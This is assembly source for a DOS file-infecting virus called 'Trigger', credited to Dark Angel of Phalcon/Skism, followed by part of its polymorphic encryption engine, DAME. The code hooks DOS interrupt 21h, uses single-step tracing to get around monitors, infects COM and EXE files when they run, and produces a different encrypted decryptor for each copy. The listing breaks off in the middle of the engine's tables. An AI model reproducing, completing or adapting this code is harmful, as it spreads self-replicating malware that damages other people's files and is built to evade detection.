-begin trigger.asm-------------------------------------------------------------
        .model  tiny
        .code
        .radix  16
        org     0

        viruslength     =       (heap - entry)
        virussizeK      =       (endvirus - entry + 3ff) / 400
        virussizepara   =       (virussizeK)*40

        EXE_ID          =       'PS'

entry:
        call    past
next:
        db      0,"Trigger by Dark Angel of Phalcon/Skism",0Dh,0A
        db      "Utilising Dark Angel's Multiple Encryptor (DAME)",0Dh,0A
        db      0Dh,0A,0

checkstub       db 72,0FA,0E,1F,0BA,00,0B8,0B8,40,00,8E,0C0,26,81,3E,63

past:   cld
        pop     bp

        mov     ax,0cf0
        mov     bx,'DA'
        int     21
        cmp     bx,'GH'
        jnz     no_trigger
trigger:
        push    ds
        push    es

        push    cs
        pop     ds
        xor     ax,ax
checkagain:
        lea     si,[bp+checkstub-next]
        mov     es,ax
        xor     di,di
        mov     cx,8
        rep     cmpsw
        jz      trigger_it
        inc     ax
        cmp     ax,0a000
        jb      checkagain
        jmp     exit_trigger
trigger_it:
        mov     [bp+patch-next],ax
        mov     ds,ax
        mov     byte ptr ds:73,0cbh
        push    bp
        mov     bp,-80
        jmp     short $+2
        db      09a ; call far ptr
        dw      1
patch   dw      ?
        pop     bp
        mov     byte ptr ds:73,1f
exit_trigger:
        pop     es
        pop     ds
        jmp     short restore

no_trigger:
        mov     ax,4b90
        int     21
        cmp     ax,bx
        jz      restore

        push    ds
        push    es

        mov     ax,ds
        dec     ax
        mov     ds,ax
        sub     word ptr ds:3,virussizepara
        sub     word ptr ds:12,virussizepara
        mov     es,ds:12

        push    cs
        pop     ds

        xor     di,di
        lea     si,[bp+offset entry-offset next]
        mov     cx,(viruslength + 1)/2
        rep     movsw

        xor     ax,ax
        mov     ds,ax
        sub     word ptr ds:413,virussizeK

        mov     di,offset oldint21
        mov     si,21*4
        movsw
        movsw

        cli

        pushf
        pushf
        pop     ax
        or      ah,1
        push    ax

        mov     ds:1*4+2,es
        mov     word ptr ds:1*4,offset int1_1

        popf

        mov     ah,30
        pushf
        call    dword ptr ds:21*4

        popf

        lds     si,dword ptr es:oldint21
        mov     di,si
        lodsw
        mov     word ptr es:int21patch1,ax
        lodsw
        mov     word ptr es:int21patch2,ax
        lodsb
        mov     byte ptr es:int21patch3,al

        push    ds ; es:di->int 21 handler
        push    es
        pop     ds ; ds->high segment
        pop     es

        mov     al,0ea
        stosb
        mov     ax,offset int21
        stosw
        mov     ax,ds
        stosw
        sti

        pop     es
        pop     ds

restore:
        cmp     sp,-2
        jnz     restoreEXE
restoreCOM:
        lea     si,[bp+readbuffer-next]
        mov     di,100
        push    di
        movsw
        movsw
        ret
restoreEXE:
        mov     ax,ds
        add     ax,10
        add     cs:[bp+readbuffer+16-next], ax
        add     ax,cs:[bp+readbuffer+0e-next]
        mov     ss,ax
        mov     sp,cs:[bp+readbuffer+10-next]
        jmp     dword ptr cs:[bp+readbuffer+14-next]

readbuffer      dw 20cdh
                dw 0bh dup (?)

int1_1:
        push    bp
        mov     bp,sp
        push    ax

        mov     ax, [bp+4]      ; get segment
        cmp     ax, cs:oldint21+2
        jae     exitint1
        mov     cs:oldint21+2,ax
        mov     ax, [bp+2]
        mov     cs:oldint21,ax
exitint1:
        pop     ax
        pop     bp
        iret

int1_2:
        push    bp
        mov     bp,sp
        push    ax

        mov     ax,cs
        cmp     ax,[bp+4]
        jz      exitint1

        mov     ax,[bp+4]
        cmp     ax,cs:oldint21+2
        jnz     int1_2_restore

        mov     ax,[bp+2]
        cmp     ax,cs:oldint21
        jb      int1_2_restore
        sub     ax,5
        cmp     ax,cs:oldint21
        jbe     exitint1
int1_2_restore:
        push    es
        push    di
        cld
        les     di,dword ptr cs:oldint21
        mov     al,0ea
        stosb
        mov     ax,offset int21
        stosw
        mov     ax,cs
        stosw
        pop     di
        pop     es

        and     [bp+6],0feff
        jmp     exitint1

install:
        mov     bx,ax
        iret
int21:
        cmp     ax,4b90
        jz      install

        push    ds
        push    di
        lds     di,dword ptr cs:oldint21
        mov     word ptr ds:[di],1234
int21patch1      =       $ - 2
        mov     word ptr ds:[di+2],1234
int21patch2      =       $ - 2
        mov     byte ptr ds:[di+4],12
int21patch3      =       $ - 1
        pop     di
        pop     ds

        cld

        cmp     ax,4b00
        jz      infect

exitint21:
        push    ds
        push    ax

        xor     ax,ax
        mov     ds,ax
        cli
        mov     word ptr ds:1*4,offset int1_2
        mov     ds:1*4+2,cs
        sti

        pushf
        pop     ax
        or      ah,1
        push    ax
        popf
        pop     ax
        pop     ds
        db      0ea
oldint21 dw     0, 0

callint21:
        pushf
        call    dword ptr cs:oldint21
        ret

already_infected:
        pop     dx
        pop     cx
        mov     ax,5701
        call    callint21

        mov     ah,3e
        call    callint21
exitnoclose:
        mov     ax,4301
        pop     dx
        pop     ds
        pop     cx
        call    callint21

exitinfect:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     bp
        pop     bx
        pop     dx
        pop     cx
        pop     ax
        jmp     exitint21

infect:
        push    ax
        push    cx
        push    dx
        push    bx
        push    bp
        push    si
        push    di
        push    ds
        push    es

        mov     ax,4300
        call    callint21
        push    cx
        push    ds
        push    dx

        mov     ax,4301
        xor     cx,cx
        call    callint21

        mov     ax,3d02
        call    callint21
        jc      exitnoclose
        xchg    ax,bx

        mov     ax,5700
        int     21
        push    cx
        push    dx

        mov     ah,3f
        mov     cx,18
        push    cs
        pop     ds
        push    cs
        pop     es
        mov     dx,offset readbuffer
        mov     si,dx
        call    callint21
        jc      already_infected

        mov     di,offset writebuffer
        mov     cx,18/2

        push    si
        push    di

        rep     movsw

        pop     di
        pop     si

        mov     ax,4202
        xor     cx,cx
        cwd
        int     21

        cmp     word ptr [di],'ZM'
        jnz     infectCOM

infectEXE:
        cmp     readbuffer+10,EXE_ID
go_already_infected:
        jz      already_infected

        mov     ds:writebuffer+4,ax
        mov     ds:writebuffer+2,dx

        mov     cx,10
        div     cx

        sub     ax,ds:writebuffer+8

        mov     ds:writebuffer+14,dx
        mov     ds:writebuffer+16,ax

        xchg    cx,dx

        mov     ds:writebuffer+0e,ax
        mov     ds:writebuffer+10,EXE_ID

        mov     al,10b
        jmp     finishinfect

infectCOM: ; si = readbuffer, di = writebuffer
        push    ax

        mov     cx,4
        xor     dx,dx
check_infection_loop:
        lodsb
        add     dl,al
        loop    check_infection_loop

        pop     ax

        or      dl,dl
        jz      go_already_infected

        mov     dx,18
        cmp     ax,dx
        jnb     no_fixup_com

        mov     ax,4200
        xor     cx,cx
        int     21
no_fixup_com:
        mov     cx,ax
        inc     ch      ; add cx,100
        sub     ax,3
        push    ax
        mov     al,0e9
        stosb
        pop     ax
        stosw
        add     al,ah
        add     al,0e9
        neg     al
        stosb

        mov     al,11b
finishinfect:
        cbw
; ax = bitmask
; bx = start decrypt in carrier file
; cx = encrypt length
; dx = start encrypt in virus
; si = buffer to put decryption routine
; di = buffer to put encryption routine
        push    bx

        xchg    cx,bx

        xor     si,si
        mov     di,offset copyvirus
        mov     cx,(heap-entry+1)/2
        rep     movsw

        push    ax
        call    rnd_init_seed
        pop     ax

        mov     dx,offset copyvirus
        mov     cx,viruslength
        mov     si,offset _decryptbuffer
        mov     di,offset _encryptbuffer
        call    dame

        push    cx

        cmp     ds:writebuffer,'ZM'
        jnz     no_fix_header

        mov     dx,ds:writebuffer+2
        mov     ax,ds:writebuffer+4
        add     cx,viruslength
        add     ax,cx
        adc     dx,0
        mov     cx,200
        div     cx
        or      dx,dx
        jz      nohiccup
        inc     ax
nohiccup:
        mov     ds:writebuffer+4,ax
        mov     ds:writebuffer+2,dx
no_fix_header:
        call    di
        pop     cx

        pop     bx

        mov     ah,40
        mov     dx,offset _decryptbuffer
        call    callint21

        mov     ah,40
        mov     cx,viruslength
        mov     dx,offset copyvirus
        call    callint21

        mov     ax,4200
        xor     cx,cx
        cwd
        int     21

        mov     ah,40
        mov     cx,18
        mov     dx,offset writebuffer
        call    callint21
        jmp     already_infected

vars = 0
include dame.asm

heap:
vars = 1
include dame.asm

writebuffer             dw       0c dup (?)
_encryptbuffer:         db       80 dup (?)
_decryptbuffer:         db      180 dup (?)
copyvirus               db      viruslength dup (?)
                        db      20 dup (?)
endvirus:

end entry
-end trigger.asm----begin dame.asm---------------------------------------------
ifndef vars
vars = 2
endif

if vars eq 1
else

_ax = 0
_cx = 1
_dx = 2
_bx = 3
_sp = 4
_bp = 5
_si = 6
_di = 7

_es = 8
_cs = 9
_ss = 0a
_ds = 0bh

MAXNEST = 0a            ; controls recursion problems

; ax = flags
;       15 : Reserved
;       14 : 0 = word, 1 = dword
;       13 : encryption direction : 0 = forwards, 1 = backwards
;       12 : counter direction : 0 = forwards, 1 = backwards
;       11 :    ^
;       10 :    R
;        9 :    E
;        8 :    S
;        7 :    E
;        6 :    R
;        5 :    V
;        4 :    E
;        3 :    D
;        2 :    v
; DAME sets the above bits
;
; Virus sets the following bits:
;        1 : garble : 1 = yes, 0 = no
;        0 : DS = CS : 1 = yes, 0 = no
; bx = start decrypt in carrier file
; cx = encrypt length
; dx = start encrypt
; si = buffer to put decryption routine
; di = buffer to put encryption routine
; ds = current cs
; es = current cs

; Returns:
;  cx = decryption routine length
;  all other registers are preserved.

rnd_init_seed:
        push    dx
        push    cx
        push    bx
        mov     ah,2C                   ; get time
        int     21

        in      al,40                   ; port 40h, 8253 timer 0 clock
        mov     ah,al
        in      al,40                   ; port 40h, 8253 timer 0 clock
        xor     ax,cx
        xor     dx,ax
        jmp     short rnd_get_loop_done
get_rand:
        push    dx
        push    cx
        push    bx
        in      al,40                   ; get from timer 0 clock
        db      5 ; add ax, xxxx
rnd_get_patch1  dw      0
                db      0BA  ; mov dx, xxxx
rnd_get_patch2  dw      0
        mov     cx,7

rnd_get_loop:
        shl     ax,1
        rcl     dx,1
        mov     bl,al
        xor     bl,dh
        jns     rnd_get_loop_loc
        inc     al
rnd_get_loop_loc:
        loop    rnd_get_loop

rnd_get_loop_done:
        mov     rnd_get_patch1,ax
        mov     rnd_get_patch2,dx
        mov     al,dl
        pop     bx
        pop     cx
        pop     dx
        retn

reg_xlat_table:
        db      10000111b ; bx
        db      0         ; sp
        db      10000110b ; bp
        db      10000100b ; si
        db      10000101b ; di

aligntable      db      3,7,0f,1f

redo_dame:
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
dame:   ; Dark Angel's Multiple Encryptor
        cld
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        call    _dame
        pop     di
        pop     si
        pop     dx
        pop     bx ; return value in cx
        pop     bx
        pop     ax
        ret

_dame:
; set up variables
        cld

        push    ax

        mov     ax,offset _encryptpointer
        xchg    ax,di           ; pointer to encryption routine buffer
        stosw
        xchg    si,ax           ; pointer to decryption routine buffer
        stosw

        stosw

        xchg    ax,dx           ; starting offset of encryption
        stosw
        xchg    ax,bx           ; starting offset of decryption routine
        stosw

        xchg    cx,dx           ; dx = encrypt size

        call    clear_used_regs
        mov     cx,(endclear1 - beginclear1) / 2
        rep     stosw

        call    get_rand
        and     ax,not 3

        pop     cx
        xor     cx,ax           ; cx = bitmask

        call    get_rand_bx
        and     bx,3
        mov     al,byte ptr [bx+aligntable]
        cbw
        add     dx,ax           ; round up
        not     ax
        and     dx,ax

        mov     ax,dx           ; new encryption length
        stosw                   ; _encrypt_length

        shr     ax,1
        test    ch,40 ; dword?
        jz      word_encryption
        shr     ax,1
word_encryption:
        test    ch,10
        jnz     counter_backwards
        neg     ax
counter_backwards:
        stosw                   ; _counter_value

        xchg    ax,dx           ; get encryption length in bytes

        test    ch,20
        jnz     encrypt_forwards
        neg     ax              ; pointer to start of decryption
encrypt_forwards:
        stosw                   ; _pointer_value

        call    get_rand
        stosw                   ; encryption value = _decrypt_value

        mov     ax,8484
        stosb
        push    di
        stosw
        stosb
        pop     di

        call    one_in_two
        js      s1
        call    get_another
        stosb
        call    get_rand
        mov     _pointer_value,ax
        dec     di
s1:
        inc     di

        jmp     short gbxoh_skip
get_bx_or_higher:
        call    clear_reg
gbxoh_skip:
        call    get_another
        cmp     al,_bx
        jb      get_bx_or_higher
        stosb                   ; _pointer_reg

        call    one_in_two
        js      s2
        call    get_another
        stosb                   ; _encrypt_reg
s2:

; encode setup part of decryption
        call    clear_used_regs
encode_setup:
        mov     di,_decryptpointer
        call    twogarble

        mov     si,offset _dummy_reg
        push    si
encode_setup_get_another:
        call    get_rand_bx
        and     bx,3
        mov     al,[si+bx]
        cbw
        test    al,80
        jnz     encode_setup_get_another
        or      byte ptr [bx+_dummy_reg],80
        mov     si,ax
        inc     byte ptr [si+offset _used_regs]

        add     bx,bx
        mov     dx,word ptr [bx+_counter_value-2]

        mov     _nest,0
        call    mov_reg_xxxx
        call    twogarble
        call    swap_decrypt_encrypt

        push    cx
        and     cl,not 3
        call    _mov_reg_xxxx
        pop     cx

        mov     _encryptpointer,di

        pop     si
        mov     dx,4
encode_setup_check_if_done:
        lodsb
        test    al,80
        jz      encode_setup
        dec     dx
        jnz     encode_setup_check_if_done

        mov     si,offset _encryptpointer
        mov     di,offset _loopstartencrypt
        movsw
        movsw

; encode decryption part of loop
        mov     _relocate_amt,0
        call    do_encrypt1
        test    ch,40
        jz      dont_encrypt2

        mov     _relocate_amt,2
        call    do_encrypt1
dont_encrypt2:
        mov     bx,offset _loopstartencrypt
        push    cx
        and     cl,not 3
        call    encodejmp
        pop     cx

        mov     ax,0c3fc ; cld, ret
        stosw

        mov     si,offset _encrypt_relocator
        mov     di,_start_encrypt

        push    cx
        call    relocate
        pop     cx

        mov     bx,offset _loopstartdecrypt
        call    encodejmp
        call    fourgarble
        mov     _decryptpointer,di

        mov     si,offset _decrypt_relocator
        sub     di,_decryptpointer2
        add     di,_start_decrypt
relocate:
        test    ch,20
        jz      do_encrypt_backwards
        add     di,_encrypt_length
do_encrypt_backwards:
        sub     di,_pointer_value
        mov     cx,word ptr [si-2]
        jcxz    exit_relocate
        xchg    ax,di
relocate_loop:
        xchg    ax,di
        lodsw
        xchg    ax,di
        add     [di],ax
        loop    relocate_loop
exit_relocate:
        mov     di,_decryptpointer
        mov     cx,di
        sub     cx,_decryptpointer2
        ret

do_encrypt1:
        call    playencrypt
        call    encryption
        call    playencrypt
        ret

encodejmp:
        mov     di,word ptr [bx+_encryptpointer-_loopstartencrypt]

        push    bx
        mov     _nest,0
        mov     al,_pointer_reg
        and     ax,7
        mov     dx,2
        test    ch,40
        jz      update_pointer1
        shl     dx,1
update_pointer1:
        test    ch,20
        jz      update_pointer2
        neg     dx
update_pointer2:
        call    add_reg_xxxx

        mov     dl,75   ; jnz

        mov     al,_counter_reg
        and     ax,7
        cmp     al,_sp
        jz      do_jnz

        push    dx
        mov     dx,1

        test    ch,10 ; check counter direction
        jz      go_counter_forwards

        cmp     al,_cx
        jnz     regular
        call    one_in_two
        js      regular

        pop     dx
        call    get_rand_bx
        xchg    bx,dx
        and     dl,2
        or      dl,0e0  ; loop/loopnz
        jmp     short do_jnz
regular:
        neg dx
go_counter_forwards:
        call    add_reg_xxxx
        pop     dx
do_jnz:
        pop     bx
        mov     ax,[bx]
        sub     ax,di
        dec     ax
        dec     ax
        xchg    ah,al
        mov     al,dl   ; jnz

        test    ah,80
        jnz     jmplocation_okay

        pop     ax
        pop     ax
        jmp     redo_dame
jmplocation_okay:
        stosw
        mov     word ptr [bx+_encryptpointer-_loopstartencrypt],di
        ret

swap_decrypt_encrypt:
        mov     _nest,MAXNEST
        mov     _decryptpointer,di
        mov     di,_encryptpointer
        ret

playencrypt:
        mov     di,_decryptpointer
        call    twogarble

        mov     al,_encrypt_reg
        and     ax,7
        cmp     al,4    ; is there an encryption register?
        jz      swap_decrypt_encrypt

        call    get_rand_bx     ; 3/4 chance of doing something
        cmp     bl,0c0
        ja      swap_decrypt_encrypt

        call    _playencrypt
        call    handle_jmp_table_nogarble
finish_encryption:
        call    swap_decrypt_encrypt
        push    cx
        and     cl,not 3
        call    [bx+si+1]
        pop     cx
        mov     _encryptpointer,di
        ret

_playencrypt:
        mov     _nest,0
        call    one_in_two
        js      get_used_register

        call    get_rand_bx
        mov     si,offset oneregtable
        jmp     short continue_playencrypt

get_used_register:
        call    get_rand_bx
        and     bx,7
        cmp     bl,_sp
        jz      get_used_register
        cmp     byte ptr [bx+_used_regs],0
        jz      get_used_register
        mov     si,offset tworegtable
continue_playencrypt:
        xchg    dx,bx
        ret

encryption:
        mov     di,_decryptpointer
        call    twogarble
        mov     al,_pointer_reg
        and     ax,7
        mov     bx,offset reg_xlat_table-3
        xlat

        mov     bp,offset _decrypt_relocate_num
        call    _playencrypt
        call    go_next
        call    handle_jmp_table_nogarble

        mov     bp,offset _encrypt_relocate_num
        call    go_next
        jmp     short finish_encryption

go_next:
        push    ax
        lodsb
        cbw
        add     si,ax
        pop     ax
        inc     si
        inc     si
        ret

clear_used_regs:
        xor     ax,ax
        mov     di,offset _used_regs
        stosw
        stosw
        inc     ax
        stosw
        dec     ax
        stosw
        ret

get_another:
        call    get_rand
        and     ax,7
        mov     si,ax
        cmp     [si+_used_regs],0
        jnz     get_another
        inc     [si+_used_regs]
        ret

clear_reg_dx:
        xchg    ax,dx
clear_reg:
        mov     si,ax
        mov     byte ptr [si+_used_regs],0
        ret

free_regs:      ; check for free registers
                ; zero flag if OK
        push    ax
        push    cx
        push    di
        mov     di,offset _used_regs
        mov     cx,8
        xor     ax,ax
        repne   scasb
        pop     di
        pop     cx
        pop     ax
        ret

one_in_two:
        push    ax
        call    get_rand
        or      ax,ax
        pop     ax
        ret

get_rand_bx:
        xchg    ax,bx
        call    get_rand
        xchg    ax,bx
return:
        ret

fourgarble:
        call    twogarble
twogarble:
        mov     _nest,0
        call    garble
garble: ; ax, dx preserved
        call    free_regs
        jne     return

        test    cl,2
        jz      return

        push    ax
        push    dx

        call    get_rand                ; random # to dx
        xchg    ax,dx
        call    get_another             ; random reg in al
        call    clear_reg               ; don't mark as used

        mov     si,offset garbletable
        jmp     short handle_jmp_table_nopush_ax_dx

handle_jmp_table: ; ax,dx preserved
        push    si
        call    garble
        pop     si
handle_jmp_table_nogarble:
        push    ax
        push    dx
handle_jmp_table_nopush_ax_dx:
        push    si

        push    cx
        xchg    ax,cx
        lodsb           ; get mask value
        cbw
        xchg    ax,cx
        call    get_rand_bx
        and     bx,cx
        pop     cx

        inc     _nest
        cmp     _nest,MAXNEST
        jb      not_max_nest
        xor     bx,bx
not_max_nest:
        push    bx
        call    [bx+si]
        pop     bx
        pop     si
        pop     dx
        pop     ax

        ret

garble_tworeg:
        mov     si,offset tworegtable
        and     dx,7
        jmp     short handle_jmp_table_nogarble
garble_onereg:
        mov     si,offset oneregtable
        jmp     short handle_jmp_table_nogarble
garble_onebyte:
        xchg    ax,dx
        and     al,7
        mov     bx,offset onebytetable
        xlat
        stosb
        ret
garble_jmpcond:
        xchg    ax,dx
        and     ax,0f
        or      al,70
        stosw
        ret

_push:
        or      al,al
        js      _push_mem
        add     al,50
        stosb
        ret
_push_mem:
        add     ax,0ff30
        jmp     short go_mod_xxx_rm1

_pop:
        or      al,al
        js      _pop_mem
        add     al,58
        stosb
        ret
_pop_mem:
        mov     ah,8f
go_mod_xxx_rm1:
        jmp     mod_xxx_rm

mov_reg_xxxx:
        mov     si,offset mov_reg_xxxx_table
go_handle_jmp_table1:
        jmp     short handle_jmp_table

_mov_reg_xxxx_mov_add:
        call    get_rand_bx
        push    bx
        sub     dx,bx
        call    mov_reg_xxxx
        pop     dx
        jmp     short go_add_reg_xxxx

_mov_reg_xxxx_mov_al_ah:
        cmp     al,_sp
        jae     _mov_reg_xxxx
        push    ax
        push    dx
        call    _mov_al_xx
        pop     dx
        pop     ax
        xchg    dh,dl
        jmp     short _mov_ah_xx

_mov_reg_xxxx_mov_xor:
        call    get_rand_bx
        push    bx
        xor     dx,bx
        call    mov_reg_xxxx
        pop     dx
        jmp     xor_reg_xxxx

_mov_reg_xxxx_xor_add:
        push    dx
        mov     dx,ax
        call    xor_reg_reg
        pop     dx
go_add_reg_xxxx:
        jmp     add_reg_xxxx

_mov_reg_xxxx_mov_rol:
        ror     dx,1
        call    mov_reg_xxxx
        jmp     short _rol

_mov_reg_xxxx_mov_ror:
        rol     dx,1
        call    mov_reg_xxxx
_ror:
        or      al,8
_rol:
        mov     ah,0d1
        jmp     mod_xxx_rm


_mov_reg_xxxx:
        add     al,0B8
        stosb
        xchg    ax,dx
        stosw
        ret

mov_ah_xx:
_mov_ah_xx:
        add     al,04
mov_al_xx:
_mov_al_xx:
        add     al,0B0
        mov     ah,dl
        stosw
        ret

mov_reg_reg:
        mov     si,offset mov_reg_reg_table
        jmp     short go_handle_jmp_table1

_mov_reg_reg_push_pop:
        push    ax
        xchg    dx,ax   ; al = reg2
        call    _push           ; push reg2
        pop     ax      ; al = reg1
        jmp     _pop            ; pop reg1
_mov_reg_reg:
        mov     ah,08Bh
        jmp     short _mod_reg_rm_direction

mov_xchg_reg_reg:
        call    one_in_two
        js      mov_reg_reg

xchg_reg_reg:
        mov     si,offset xchg_reg_reg_table
        jmp     handle_jmp_table

_xchg_reg_reg_push_pop:
        push    dx      ; save reg2
        push    ax      ; save reg1
        push    dx
        call    _push   ; push reg1
        pop     ax
        call    _push   ; push reg2
        pop     ax
        call    _pop    ; pop  reg1
        pop     ax
        jmp     _pop    ; pop  reg2

_xchg_reg_reg_3rd_reg:
        call    free_regs
        jne     _xchg_reg_reg

        push    dx      ; save reg2
        push    ax      ; save reg1
        call    get_another
        call    mov_xchg_reg_reg     ; mov/xchg reg3, reg2
        pop     dx      ; get reg1
        call    xchg_reg_reg    ; xchg reg3, reg1
        pop     dx      ; get reg2
        xchg    ax,dx   ; ax=reg2, dx=reg3
        call    mov_xchg_reg_reg    ; mov/xchg reg2, reg3
        jmp     clear_reg_dx

_xchg_reg_reg:
        or      al,al
        js      __xchg_reg_reg

        cmp     al,dl
        jg      _xchg_reg_reg_skip
        xchg    al,dl
_xchg_reg_reg_skip:
        or      dl,dl
        jz      _xchg_ax_reg
__xchg_reg_reg:
        xchg    al,dl
        mov     ah,87
        jmp     short _mod_reg_rm
_xchg_ax_reg:
        add     al,90
        stosb
        ret

xor_reg_xxxx_xor_xor:
        call    get_rand_bx
        push    bx
        xor     dx,bx
        call    xor_reg_xxxx
        pop     dx
        jmp     short xor_reg_xxxx

xor_reg_xxxx:
        mov     si,offset xor_reg_xxxx_table
        jmp     handle_jmp_table

_xor_reg_xxxx:
        or      al,030
        jmp     _81h_

xor_reg_reg:
        mov     si,offset xor_reg_reg_table
        jmp     handle_jmp_table

_xor_reg_reg:
        mov     ah,33
_mod_reg_rm_direction:
        or      al,al
        js      dodirection
        or      dl,dl
        js      _mod_reg_rm
        call    one_in_two
        js      _mod_reg_rm
dodirection:
        xchg    al,dl
        sub     ah,2
_mod_reg_rm:
        shl     al,1
        shl     al,1
        shl     al,1
        or      al,dl
mod_xxx_rm:
        or      al,al
        js      no_no_reg

        or      al,0c0
no_no_reg:
        xchg    ah,al

        test    ah,40
        jnz     exit_mod_reg_rm

        test    cl,1
        jnz     continue_mod_xxx_rm

        push    ax
        mov     al,2e
        stosb
        pop     ax
continue_mod_xxx_rm:
        stosw

        mov     si,cs:[bp]      ; need cs: overrides on bp
        add     si,si
        mov     cs:[si+bp+2],di
        inc     word ptr cs:[bp]

        mov     al,_relocate_amt
        cbw
exit_mod_reg_rm:
        stosw
        ret

add_reg_reg:
        mov     si,offset add_reg_reg_table
        jmp     handle_jmp_table

_add_reg_reg:
        mov     ah,3
        jmp     short _mod_reg_rm_direction

sub_reg_reg:
        mov     si,offset sub_reg_reg_table
        jmp     handle_jmp_table

_sub_reg_reg:
        mov     ah,2bh
        jmp     short _mod_reg_rm_direction

_add_reg_xxxx_inc_add:
        call    inc_reg
        dec     dx
        jmp     short add_reg_xxxx

_add_reg_xxxx_dec_add:
        call    dec_reg
        inc     dx
        jmp     short add_reg_xxxx

_add_reg_xxxx_add_add:
        call    get_rand_bx
        push    bx
        sub     dx,bx
        call    add_reg_xxxx
        pop     dx
        jmp     short add_reg_xxxx

add_reg_xxxx1:
        neg     dx
add_reg_xxxx:
        or      dx,dx
        jnz     cont
return1:
        ret
cont:
        mov     si,offset add_reg_xxxx_table
        jmp     handle_jmp_table

_add_reg_xxxx:
        or      al,al
        jz      _add_ax_xxxx
_81h_:
        or      al,al
        js      __81h
        add     al,0c0
__81h:
        mov     ah,81
        call    mod_xxx_rm
_encode_dx_:
        xchg    ax,dx
        stosw
        ret
_add_ax_xxxx:
        mov     al,5
_encode_al_dx_:
        stosb
        jmp     short _encode_dx_

sub_reg_xxxx1:
        neg     dx
sub_reg_xxxx:
_sub_reg_xxxx:
        or      dx,dx
        jz      return1

        or      al,al
        jz      _sub_ax_xxxx
        add     al,028
        jmp     short _81h_
_sub_ax_xxxx:
        mov     al,2dh
        jmp     short _encode_al_dx_

dec_reg:
        push    ax
        add     al,8
        jmp     short _dec_inc_reg
inc_reg:
        push    ax
_dec_inc_reg:
        or      al,al
        jns     _norm_inc
        mov     ah,0ff
        call    mod_xxx_rm
        pop     ax
        ret
_norm_inc:
        add     al,40
        stosb
        pop     ax
        ret

_mov_reg_reg_3rd_reg:
        mov     bx,offset mov_reg_reg
        mov     si,offset mov_xchg_reg_reg
        jmp     short reg_to_reg

xor_reg_reg_reg_reg:
        mov     bx,offset _xor_reg_reg
        jmp     short reg_to_reg1
add_reg_reg_reg_reg:
        mov     bx,offset _add_reg_reg
        jmp     short reg_to_reg1
sub_reg_reg_reg_reg:
        mov     bx,offset _sub_reg_reg
reg_to_reg1:
        mov     si,bx
reg_to_reg:
        call    free_regs
        jne     no_free_regs

        push    ax
        push    si
        call    get_another
        call    mov_reg_reg     ; mov reg3, reg2
        pop     si
        pop     dx              ; ax=reg3, dx=reg1
        xchg    ax,dx           ; ax=reg1, dx=reg3

        push    dx
        call    si
        pop     dx
go_clear_reg_dx:
        jmp     clear_reg_dx

_xor_reg_xxxx_reg_reg:
        mov     bx,offset xor_reg_xxxx
        mov     si,offset xor_reg_reg
xxxx_to_reg:
        call    free_regs
        jne     no_free_regs

        push    ax
        push    si
        call    get_another
        call    mov_reg_xxxx
        xchg    ax,dx
        pop     si
        pop     ax

        push    dx
        call    si
        pop     dx
        jmp     short go_clear_reg_dx
no_free_regs:
        jmp     bx

_add_reg_xxxx_reg_reg:
        mov     bx,offset add_reg_xxxx
        mov     si,offset add_reg_reg
        jmp     short xxxx_to_reg

_mov_reg_xxxx_reg_reg:
        mov     bx,offset mov_reg_xxxx
        mov     si,offset mov_xchg_reg_reg
        jmp     short xxxx_to_reg

garbletable:
        db      garbletableend - $ - 3
        dw      offset return
        dw      offset return
        dw      offset garble_tworeg
        dw      offset garble_tworeg
        dw      offset garble_onereg
        dw      offset garble_onereg
        dw      offset garble_onebyte
        dw      offset garble_jmpcond
garbletableend:

onebytetable:
        clc
        cmc
        stc
        cld
        std
        sti
        int     3
        lock

oneregtable:
        db      oneregtableend - $ - 3
        dw      offset xor_reg_xxxx
        dw      offset mov_reg_xxxx
        dw      offset sub_reg_xxxx
        dw      offset add_reg_xxxx
        dw      offset dec_reg
        dw      offset inc_reg
        dw      offset _ror
        dw      offset _rol
oneregtableend:

oneregtable1:
        db      oneregtable1end - $ - 3
        dw      offset xor_reg_xxxx
        dw      offset sub_reg_xxxx
        dw      offset add_reg_xxxx
        dw      offset add_reg_xxxx
        dw      offset dec_reg
        dw      offset inc_reg
        dw      offset _ror
        dw      offset _rol
oneregtable1end:

oneregtable2:
        db      oneregtable2end - $ - 3
        dw      offset xor_reg_xxxx
        dw      offset add_reg_xxxx
        dw      offset sub_reg_xxxx
        dw      offset sub_reg_xxxx
        dw      offset inc_reg
        dw      offset dec_reg
        dw      offset _rol
        dw      offset _ror
oneregtable2end:

tworegtable:
        db      tworegtableend - $ - 3
        dw      offset xor_reg_reg
        dw      offset mov_reg_reg
        dw      offset sub_reg_reg
        dw      offset add_reg_reg
tworegtableend:

tworegtable1:
        db      tworegtable1end - $ - 3
        dw      offset xor_reg_reg
        dw      offset xor_reg_reg
        dw      offset sub_reg_reg
        dw      offset add_reg_reg
tworegtable1end:

tworegtable2:
        db      tworegtable2end - $ - 3
        dw      offset xor_reg_reg
        dw      offset xor_reg_reg
        dw      offset add_reg_reg
        dw      offset sub_reg_reg
tworegtable2end:

mov_reg_xxxx_table:
        db      mov_reg_xxxx_table_end - $ - 3
        dw      offset _mov_reg_xxxx
        dw      offset _mov_reg_xxxx_reg_reg
        dw      offset _mov_reg_xxxx_mov_add
        dw      offset _mov_reg_xxxx_mov_al_ah
        dw      offset _mov_reg_xxxx_mov_xor
        dw      offset _mov_reg_xxxx_xor_add
        dw      offset _mov_reg_xxxx_mov_rol
        dw      offset _mov_reg_xxxx_mov_ror

mov_reg_xxxx_table_end:

mov_reg_reg_table:
        db      mov_reg_reg_table_end - $ - 3
        dw      offset _mov_reg_reg
        dw      offset _mov_reg_reg
        dw      offset _mov_reg_reg_3rd_reg
        dw      offset _mov_reg_reg_push_pop
mov_reg_reg_table_end:

xchg_reg_reg_table:
        db      xchg_reg_reg_table_end - $ - 3
        dw      offset _xchg_reg_reg
        dw      offset _xchg_reg_reg
        dw      offset _xchg_reg_reg_push_pop
        dw      offset _xchg_reg_reg_3rd_reg
xchg_reg_reg_table_end:

xor_reg_xxxx_table:
        db      xor_reg_xxxx_table_end - $ - 3
        dw      offset _xor_reg_xxxx
        dw      offset _xor_reg_xxxx
        dw      offset _xor_reg_xxxx_reg_reg
        dw      offset xor_reg_xxxx_xor_xor
xor_reg_xxxx_table_end:

xor_reg_reg_table:
        db      xor_reg_reg_table_end - $ - 3
        dw      offset _xor_reg_reg
        dw      offset xor_reg_reg_reg_reg
xor_reg_reg_table_end:

add_reg_reg_table:
